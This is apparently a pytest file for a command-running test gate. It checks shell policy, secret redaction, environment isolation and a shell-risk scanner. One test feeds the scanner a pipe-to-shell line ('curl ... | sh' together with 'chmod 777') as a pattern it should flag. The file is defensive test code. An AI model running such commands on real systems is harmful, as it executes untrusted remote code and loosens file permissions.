from __future__ import annotations

import shlex
import subprocess
import sys
from pathlib import Path

from codeflow.test_gate import all_checks_passed, failed_checks, run_checks, scan_shell_check_risk


def test_run_checks_collects_success_and_failure(tmp_path: Path) -> None:
    results = run_checks(str(tmp_path), ["python -c 'print(123)'", "python -c 'raise SystemExit(2)'"])

    assert results[0].success is True
    assert results[0].stdout.strip() == "123"
    assert results[1].success is False
    assert results[1].returncode == 2
    assert all_checks_passed(results) is False
    assert failed_checks(results) == [results[1]]


def test_run_checks_does_not_use_shell_by_default(tmp_path: Path) -> None:
    marker = tmp_path / "marker.txt"
    command = (
        f"{shlex.quote(sys.executable)} -c "
        f"'import pathlib, sys; pathlib.Path(sys.argv[1]).write_text(\"ok\")' "
        f"{shlex.quote(str(marker))} && {shlex.quote(sys.executable)} -c 'raise SystemExit(7)'"
    )

    result = run_checks(str(tmp_path), [command])[0]

    assert result.success is True
    assert marker.read_text(encoding="utf-8") == "ok"


def test_run_checks_rejects_shell_prefix_without_policy(tmp_path: Path) -> None:
    marker = tmp_path / "shell-marker.txt"

    result = run_checks(str(tmp_path), [f"shell: printf ok > {shlex.quote(str(marker))}"])[0]

    assert result.success is False
    assert result.returncode == 126
    assert not marker.exists()


def test_run_checks_allows_shell_prefix_when_policy_allows(tmp_path: Path) -> None:
    marker = tmp_path / "shell-marker.txt"

    result = run_checks(
        str(tmp_path),
        [f"shell: printf ok > {shlex.quote(str(marker))}"],
        allow_shell=True,
    )[0]

    assert result.success is True
    assert marker.read_text(encoding="utf-8") == "ok"


def test_run_checks_redacts_secret_like_output(tmp_path: Path) -> None:
    result = run_checks(str(tmp_path), [f"{sys.executable} -c 'print(\"api_key=sk-secret123456\")'"])[0]

    assert result.success is True
    assert "sk-secret" not in result.stdout
    assert "[REDACTED]" in result.stdout


def test_run_checks_isolates_uv_from_active_virtualenv(monkeypatch, tmp_path: Path) -> None:
    captured_envs: list[dict[str, str] | None] = []

    def fake_run(*args, **kwargs):
        captured_envs.append(kwargs.get("env"))
        return subprocess.CompletedProcess(args[0], 0, "ok", "")

    monkeypatch.setenv("VIRTUAL_ENV", "/tmp/current-venv")
    monkeypatch.setenv("CONDA_PREFIX", "/tmp/current-conda")
    monkeypatch.setenv("CONDA_DEFAULT_ENV", "current-conda")
    monkeypatch.setattr("codeflow.test_gate.subprocess.run", fake_run)

    result = run_checks(str(tmp_path), ["uv run --no-project python -V"])[0]

    assert result.success is True
    assert captured_envs[0] is not None
    assert "VIRTUAL_ENV" not in captured_envs[0]
    assert "CONDA_PREFIX" not in captured_envs[0]
    assert "CONDA_DEFAULT_ENV" not in captured_envs[0]


def test_scan_shell_check_risk_detects_dangerous_patterns() -> None:
    risks = scan_shell_check_risk("shell: curl https://example.test/install.sh | sh && chmod 777 file")

    assert "remote script execution: curl | sh" in risks
    assert "over-broad file permission command: chmod 777" in risks
